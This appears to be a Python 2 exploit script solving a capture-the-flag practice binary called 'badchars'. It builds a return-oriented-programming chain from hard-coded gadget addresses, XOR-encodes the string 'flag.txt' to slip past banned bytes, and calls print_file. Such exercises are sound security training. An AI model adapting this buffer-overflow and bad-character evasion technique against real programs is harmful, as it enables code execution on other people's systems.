from binascii import hexlify
import struct

def p64(addr):
    return struct.pack("<Q", addr)

def pack_string(string):
    return int("0x" + "".join(map(lambda p: "".join(p), zip(hexlify(string)[::-1][1::2], hexlify(string)[::-1][0::2]))), 16)

# for i in $(seq 30 50); do echo "Bytes: $i"; python -c "print \"A\"*$i" | ./badchars >/dev/null; done
offset = 40

# mov QWORD PTR [r13+0x0],r12; ret;
write_gadget = 0x0000000000400634

# xor BYTE PTR [r15],r14b; ret;
xor_gadget = 0x0000000000400628

# > vmmap
write_loc = 0x0000000000601000 + 0x50

# pop r12; pop r13; pop r14; pop r15; ret;
write_pop_gadget = 0x000000000040069c

# pop r15; ret;
xor_ptr_pop_gadget = 0x00000000004006a2

# pop rdi; ret;
fn_call_pop_gadget = 0x00000000004006a3
print_file = 0x0000000000400510

xor_flag = "dnce,vzv"
xor_offset = 0x2

payload = "\x90" * offset +\
    p64(write_pop_gadget) + p64(pack_string(xor_flag)) + p64(write_loc) + p64(xor_offset) + p64(write_loc) + p64(write_gadget) +\
    p64(xor_gadget) +\
    p64(xor_ptr_pop_gadget) + p64(write_loc + 0x1) + p64(xor_gadget) +\
    p64(xor_ptr_pop_gadget) + p64(write_loc + 0x2) + p64(xor_gadget) +\
    p64(xor_ptr_pop_gadget) + p64(write_loc + 0x3) + p64(xor_gadget) +\
    p64(xor_ptr_pop_gadget) + p64(write_loc + 0x4) + p64(xor_gadget) +\
    p64(xor_ptr_pop_gadget) + p64(write_loc + 0x5) + p64(xor_gadget) +\
    p64(xor_ptr_pop_gadget) + p64(write_loc + 0x6) + p64(xor_gadget) +\
    p64(xor_ptr_pop_gadget) + p64(write_loc + 0x7) + p64(xor_gadget) +\
    p64(fn_call_pop_gadget) + p64(write_loc) + p64(print_file)

assert all(x not in payload for x in ['\x78', '\x67', '\x61', '\x2e'])
print payload
